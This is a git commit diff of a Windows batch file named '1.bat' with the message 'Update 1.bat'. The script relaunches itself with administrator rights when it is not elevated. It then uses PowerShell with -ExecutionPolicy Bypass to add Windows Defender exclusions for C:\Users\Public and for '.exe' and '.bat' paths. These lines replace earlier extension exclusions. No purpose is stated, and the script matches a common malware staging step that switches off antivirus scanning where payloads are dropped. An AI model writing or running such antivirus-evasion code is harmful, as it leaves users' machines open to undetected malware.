8fc45ad1e67dd501b2d6d9f759d612d19b7decea
NHTBOT <140639828+NHTBOT@users.noreply.github.com>
2023-11-09 14:07:24 +0700

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,6 +1,7 @@
 @echo off
 @whoami /groups | find "S-1-16-12288" > nul
 @if errorlevel 1 PowerShell Start-Process '%0' -Verb RunAs & exit /b
-powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
-powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath C:\Users\Public""' -Verb RunAs"
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath .exe""' -Verb RunAs"
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath .bat""' -Verb RunAs"
 pause > nul
